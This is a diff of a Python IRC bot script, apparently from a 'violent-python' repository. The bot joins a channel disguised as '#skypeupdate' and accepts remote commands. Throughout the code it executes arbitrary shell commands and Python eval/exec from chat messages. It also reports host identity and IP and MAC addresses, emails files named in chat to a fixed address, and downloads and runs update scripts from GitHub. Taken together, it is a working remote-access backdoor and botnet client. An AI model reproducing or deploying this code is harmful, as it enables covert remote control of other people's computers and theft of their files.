@@ -7,36 +7,37 @@ import socket
 import getpass
 import random
 import signal
+import time
 import os
+import sys
 import subprocess
 from subprocess import Popen, PIPE, STDOUT
-import time
 from time import strftime, sleep
-import sys
 from StringIO import StringIO
 
-version = "1.9.6"
+version = "2.0.0"  #bot version
 
-def log(prefix, content=''):
-   try:
-      for line in content.split('\n'):
-         print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
-   except:
-      print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))
+#function used to log things to the console
+def log(prefix, content=''):        
+    try:
+        for line in content.split('\n'):
+            print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
+    except:
+        print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))
 
 log("[*] IRC BOT v%s" % version)
 
 ############ Variables
 
-server = 'irc.freenode.net'                                        # IRC server to connect to
-port = 6667                                                        # you really shouldnt need these comments
-channel = '#skypeupdate'                                                      # duh
-admin = 'thesquash'                                                # the nick of the master of bots!
+server = 'irc.freenode.net'
+port = 6667
+channel = '#skypeupdate'
+admin = 'thesquash'                                                # the nick used for privmsgs
 
 hostname = socket.gethostname()
 local_user = getpass.getuser()
 
-nick = '[%s|%s]' % (local_user, hostname)                                             # final format will be [username|hostname]rand, boy do i wish IRC allowed nicks with @ characters
+nick = '[%s|%s]' % (local_user, hostname)
 
 helpmsg = '''Version: v%s\n
 Public Commands: \n
@@ -46,7 +47,8 @@ Public Commands: \n
  4. !identify        #-- provide info on host system\n
  5. !update          #-- update the bot from git\n
  6. $<command>       #-- run <command> in shell and capture live output\n
- 7. email$           #-- send an email with attachments listed after $\n
+ 7. >>><python>      #-- eval/exec python live in the bot script\n
+ 8. email$           #-- send an email with attachments listed after $\n
  Private Commands: \n
  1. help             #-- show this message \n
  2. version          #-- display bot version \n
@@ -55,72 +57,73 @@ Public Commands: \n
  5. identify         #-- provide verbose info on host system\n
  6. update           #-- update the bot from git\n
  7. $<command>       #-- run <command> in shell and capture live output\n
- 8. email$           #-- send an email with attachments listed after $\n''' % version
+ 8. >>><python>      #-- eval/exec python live in the bot script\n
+ 9. email$           #-- send an email with attachments listed after $\n''' % version
 
 ############ IRC functions
 
 def line_split(seq, n):
-   output = []
-   if (seq.find('\n') == -1):
-      output.append(seq)
-   else:
-      while (seq.find('\n') != -1):
-         output.append(seq.split("\n", 1)[0])
-         seq = seq.split("\n", 1)[1]
-   splitout = []
-   for line in output:
-      while line:
-         splitout.append(line[:n])
-         line = line[n:]
-   return splitout
+    output = []
+    if (seq.find('\n') == -1):
+        output.append(seq)
+    else:
+        while (seq.find('\n') != -1):
+            output.append(seq.split("\n", 1)[0])
+            seq = seq.split("\n", 1)[1]
+    splitout = []
+    for line in output:
+        while line:
+            splitout.append(line[:n])
+            line = line[n:]
+    return splitout
 
 def scan(match):                                                  # function to scan main channel messages for strings
-   if data.find(channel) != -1 and not data.find(nick) != -1:     # checking to make sure its not a private message
-      return data.find(match) != -1
-   else:
-      return False
+    if data.find(channel) != -1 and not data.find(nick) != -1:     # checking to make sure its not a private message
+        return data.find(match) != -1
+    else:
+        return False
 
 def privscan(match):                                              # function to scan private messages to the bot for strings
-   if data.find('PRIVMSG %s :%s' % (nick, match)) != -1:
-      header = data.split("PRIVMSG")[0]
-      return header.find(':%s!' % admin) != -1                    # checks to make sure private message is from admin
+    if data.find('PRIVMSG %s :%s' % (nick, match)) != -1:
+        header = data.split("PRIVMSG")[0]
+        return header.find(':%s!' % admin) != -1                    # checks to make sure private message is from admin
 
 def handler(signum, frame):
-   raise Exception("timedout")
+    raise Exception("timedout")
 
 def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
-   log('[+] Sent Data:')
-   msg = str(msg)
-   if (len(msg) > 480) or (msg.find('\n') != -1):
-      log('[#] Starting multiline output.')
-      msgs = line_split(msg, 480)
-      total = len(msgs)
-      for num, line in enumerate(msgs):
-         log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
-         irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))
-         sleep(1)
-      log('[#] Finished multiline output.')  
-   else:
-      log('[<]    PRIVMSG %s :%s\r' % (to, msg))
-      irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))
+    log('[+] Sent Data:')
+    msg = str(msg)
+    if (len(msg) > 480) or (msg.find('\n') != -1):
+        log('[#] Starting multiline output.')
+        msgs = line_split(msg, 480)
+        total = len(msgs)
+        for num, line in enumerate(msgs):
+            log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
+            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))
+            sleep(1)
+        log('[#] Finished multiline output.')  
+    else:
+        log('[<]    PRIVMSG %s :%s\r' % (to, msg))
+        irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))
 
 def broadcast(msg):                                               # function to send a message to the main channel
-   privmsg(msg, channel)
+    privmsg(msg, channel)
 
-def do(cmd, timeout=60, verbose=False):
+def run_shell(cmd, timeout=60, verbose=False):                    # verbose enables live command output via yield
    out = ''
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(timeout)
    try:
       p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
       log("[$]   Started.")
-      run = 1
+      continue_running = 1
    except Exception as e:
       yield("Failed: %s" % e)
       out += "Failed: %s" % e
-      run = 0
+      continue_running = 0
    signal.alarm(0)
-   while(run):
+   while(continue_running):
       signal.signal(signal.SIGALRM, handler)
       signal.alarm(4)
       try:
@@ -137,7 +140,7 @@ def do(cmd, timeout=60, verbose=False):
          log('[+] Recieved:')
          log('[>]    ', data)
          if (data.find('!cancel') != -1):
-            run = 0
+            continue_running = 0
             retcode = "Cancelled."
             yield("[X]: %s" % retcode)
             os.killpg(p.pid, signal.SIGTERM)
@@ -157,10 +160,10 @@ def do(cmd, timeout=60, verbose=False):
             yield("[X]: %s" % retcode)
          elif (retcode == 0) and verbose:
             yield("[√]")
-         run = 0
+         continue_running = 0
          break
 
-def evaluate(cmd):
+def run_python(cmd):                                              # interactively interprets recieved python code
    try:
       buffer = StringIO()
       sys.stdout = buffer
@@ -169,14 +172,17 @@ def evaluate(cmd):
       out = buffer.getvalue()
    except Exception as error:
       out = error
-   if len(str(out).strip()) < 1:
+   out = str(out).strip()
+   if len(out) < 1:
       try:
-         out += "\nEval: "+str(eval(cmd))
+         out = "[eval]: "+str(eval(cmd))
       except Exception as error:
-         out += "\nEval Failed: "+str(error)
-   return str(out)
+         out = "[eval]: "+str(error)
+   else:
+      out = "[exec]: "+out
+   return out.strip()
 
-def run(cmd, public=False):
+def run(cmd, public=False):                                       # wrapper for run_shell which improves logging and responses
    def respond(content):
       if public:
          broadcast(content)
@@ -187,7 +193,7 @@ def run(cmd, public=False):
    cmd = cmd.strip()
    log("[+] Ran Command:")
    log("[$]   CMD: ", [cmd])
-   for line in do(cmd, verbose=True):
+   for line in run_shell(cmd, verbose=True):
       respond(line)
    log('[#] Done.')
    split = line_split(out, 480)
@@ -196,7 +202,7 @@ def run(cmd, public=False):
       log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
       log("\n")
 
-def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Test",attch=[]): # do not use attch.append() http://stackoverflow.com/a/113198/2156113
+def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Info",attch=[]): # do not use attch.append() http://stackoverflow.com/a/113198/2156113
    err = """\n
       sudo mkdir -p /Library/Server/Mail/Data/spool\n
       sudo /usr/sbin/postfix set-permissions\n
@@ -224,22 +230,21 @@ def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Test",attch=
    else:
       return "Sent email to %s. (subject: %s, attachments: %s)" % (to, subj, str(attch))
 
-
-def selfupdate(git_user="nikisweeting",git_repo="violent-python"):
+def selfupdate(git_user="nikisweeting",git_repo="violent-python"):    # updates the bot by downloading source from github, then running update.sh
    log('[*] Starting Selfupdate...')
    privmsg('[*] Starting Selfupdate...')
    log('[>]   Downloading source code from git')
    cmd = "rm -Rf code.zip code; curl https://codeload.github.com/%s/%s/zip/master > code.zip" % (git_user, git_repo)
-   for line in do(cmd):
+   for line in run_shell(cmd):
       log('[>]    ',line)
       privmsg('[>]    %s' % line)
    cmd = "unzip code.zip -d code"
-   for line in do(cmd):
+   for line in run_shell(cmd):
       log('[>]    ',line)
       privmsg('[>]    %s' % line)
    pid = os.getpid()
    cmd = "sh code/*/update.sh %s" % pid
-   for line in do(cmd):
+   for line in run_shell(cmd):
       log('[>]    ',line)
       privmsg('[>]    %s' % line)
       if line.find("Starting") != -1:
@@ -248,10 +253,12 @@ def selfupdate(git_user="nikisweeting",git_repo="violent-python"):
          irc.send ( 'QUIT\r\n' )
          raise SystemExit(0)
 
-def identify():
+def identify():                                                   # give some identifying info about the host computer
    log('[+] Running Identification Scripts...')
    import platform
    system = platform.mac_ver()[0]
+   if len(str(system)) < 1:
+      system = platform.platform()
    log('[>]    OS X:    ',system)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8",80))
@@ -266,7 +273,7 @@ def identify():
    log('[>]    MAC:     ',mac_addr)
    return "[v%s/x%s] %s@%s l: %s p: %s MAC: %s" % (version, system.strip(), local_user.strip(), hostname, local_ip, public_ip, mac_addr)
 
-def priv_identify():
+def priv_identify():                                              # give verbose identifying info about the host computer
    log('[+] Running Identification Scripts...')
    privmsg('[+] Running Identification Scripts...')
    import platform
@@ -292,17 +299,17 @@ def priv_identify():
    privmsg('[>]      MAC:     %s' % mac_addr)
 
    cmd = "system_profiler SPPowerDataType | grep Connected"
-   for line in do(cmd):
+   for line in run_shell(cmd):
       log('[>]    Power:    ',line)
       privmsg('[>]      Power:    %s' % line)
 
    cmd = "uptime"
-   for line in do(cmd):
+   for line in run_shell(cmd):
       log('[>]    UP:    ',line)
       privmsg('[>]      Up:    %s' % line)
 
    cmd = "cd /Users/; du -s * 2>/dev/null | sort -nr | head -1 | awk  '{print $2}'"
-   for line in do(cmd):
+   for line in run_shell(cmd):
       log('[>]    User:    ',line)
       privmsg('[>]      User:    %s' % line)
 
@@ -318,100 +325,106 @@ def priv_identify():
 
 ############The beef of things
 if __name__ == '__main__':
-   if len(nick) > 15: nick = '[%s]' % (local_user[:13])
-   last_ping = time.time()
-   threshold = 5 * 60
-   quit_status = False
-   while not quit_status:
-      timeout_count = 0
-      last_data = data = ''
-      log("[+] Connecting...")
-      log("[<]    Nick:        ", nick)
-      log("[<]    Server:      ", server+':'+str(port))
-      log("[<]    Room:        ", channel)
-      try:
-         irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-         irc.settimeout(60)
-         irc.connect((server, port))
-         recv = irc.recv ( 4096 )
-         log("[+] Recieved:    ", recv+'\n')
-         irc.send ('NICK %s\r\n' % nick )
-         irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
-         irc.send ('JOIN %s\r\n' % channel)
-         privmsg('Bot v%s Running.' % version)
-      except Exception as error:
-         log('[*] Connection Failed: ')
-         log('[X]    ',error)
-         timeout_count = 50
-         sleep(10)
-
-      while not quit_status and (timeout_count < 50):
-         if (last_data == data):
-            timeout_count += 1
-         try:
-            data = irc.recv ( 4096 )
-            log('[+] Recieved:')
-            log('[>]    ', data)
-         except socket.timeout:
-            if (time.time() - last_ping) > threshold:
-               log('[*] Disconnected.')
-               timedout_count = 50
-               break
-            else:
-               data = str(time.time())
-               timedout_count = 0
-               pass
-
-         if data.find ('PING') != -1:                                     # im warning you, dont touch this bit
-            irc.send ('PONG ' + data.split()[1] + '\r')
-            last_ping = time.time()
-            log('[+] Sent Data:')
-            log('[<]    PONG ',data.split()[1])
-            timeout_count = 0    
-
-         elif data.find('ickname is already in use') != -1:
-            nick += str(random.randint(1,200))
-            if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
+    if len(nick) > 15: nick = '[%s]' % (local_user[:13])
+    last_ping = time.time()
+    threshold = 5 * 60
+    quit_status = False
+    while not quit_status:
+        timeout_count = 0
+        last_data = data = ''
+        log("[+] Connecting...")
+        log("[<]    Nick:        ", nick)
+        log("[<]    Server:      ", server+':'+str(port))
+        log("[<]    Room:        ", channel)
+        try:
+            irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            irc.settimeout(60)
+            irc.connect((server, port))
+            recv = irc.recv ( 4096 )
+            log("[+] Recieved:    ", recv+'\n')
+            irc.send ('NICK %s\r\n' % nick )
+            irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
+            irc.send ('JOIN %s\r\n' % channel)
+            privmsg('Bot v%s Running.' % version)
+        except Exception as error:
+            log('[*] Connection Failed: ')
+            log('[X]    ',error)
             timeout_count = 50
+            sleep(10)
 
-         elif scan('!quit') or privscan('quit'):
-            privmsg('Quitting.')
-            irc.send ( 'QUIT\r\n' )
-            quit_status = True
+        while not quit_status and (timeout_count < 50):
+            if (last_data == data):
+                timeout_count += 1
+            last_data = data
+            try:
+                data = irc.recv ( 4096 )
+                log('[+] Recieved:')
+                log('[>]    ', data)
+            except socket.timeout:
+                if (time.time() - last_ping) > threshold:
+                    log('[*] Disconnected.')
+                    timedout_count = 50
+                    break
+                else:
+                    data = str(time.time())
+                    timedout_count = 0
+                    pass
 
-         elif scan('!reload') or privscan('reload'):
-            privmsg('Reloading.')
-            irc.send ( 'QUIT\r\n' )
-            break
+            ##Operation keyword matches
+            if data.find ('PING') != -1:
+                irc.send ('PONG ' + data.split()[1] + '\r')
+                last_ping = time.time()
+                log('[+] Sent Data:')
+                log('[<]    PONG ',data.split()[1])
+                timeout_count = 0    
 
-         elif scan('!update') or privscan('update'):        selfupdate()
-         elif scan('!version'):                             broadcast(version)
-         elif scan('!identify'):                            broadcast(identify())
-         elif privscan('help'):                             privmsg(helpmsg)
-         elif privscan('version'):                          privmsg(version)
-         elif privscan('identify'):                         priv_identify()
+            elif data.find('ickname is already in use') != -1:
+                nick += str(random.randint(1,200))
+                if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
+                timeout_count = 50
+                quit_status = False
+                break
 
-         elif scan('email$'):
-            attch = data.split("$", 1)[1].split(',')
-            to = "nikisweeting+bot@gmail.com"
-            broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
+            ##Control keyword matches
+            elif scan('!quit') or privscan('quit'):
+                privmsg('Quitting.')
+                irc.send ( 'QUIT\r\n' )
+                quit_status = True
 
-         elif scan('$'):
-            cmd = data.split("$", 1)[1]
-            run(cmd, public=True)
+            elif scan('!reload') or privscan('reload'):
+                privmsg('Reloading.')
+                irc.send ( 'QUIT\r\n' )
+                quit_status = False
+                break
 
-         elif privscan('$'):
-            cmd = data.split("$", 1)[1]
-            run(cmd, public=False)
+            ##Simple Matches with no arguments
+            elif scan('!update') or privscan('update'):        selfupdate()
+            elif scan('!version'):                             broadcast(version)
+            elif scan('!identify'):                            broadcast(identify())
+            elif privscan('help'):                             privmsg(helpmsg)
+            elif privscan('version'):                          privmsg(version)
+            elif privscan('identify'):                         priv_identify()
 
-         elif privscan('>>>'):
-            cmd = data.split(">>>", 1)[1]
-            privmsg(evaluate(cmd))
+            ##Complex Matches with arguments
+            elif scan('email$'):
+                attch = data.split("$", 1)[1].split(',')
+                to = "nikisweeting+bot@gmail.com"
+                broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
 
-         elif scan('>>>'):
-            cmd = data.split(">>>", 1)[1]
-            broadcast(evaluate(cmd))
+            elif scan('$'):
+                cmd = data.split("$", 1)[1]
+                run(cmd, public=True)
 
-         last_data = data
+            elif privscan('$'):
+                cmd = data.split("$", 1)[1]
+                run(cmd, public=False)
 
-   log("[*] EXIT")
+            elif privscan('>>>'):
+                cmd = data.split(">>>", 1)[1]
+                privmsg(run_python(cmd))
+
+            elif scan('>>>'):
+                cmd = data.split(">>>", 1)[1]
+                broadcast(run_python(cmd))
+
+    log("[*] EXIT")
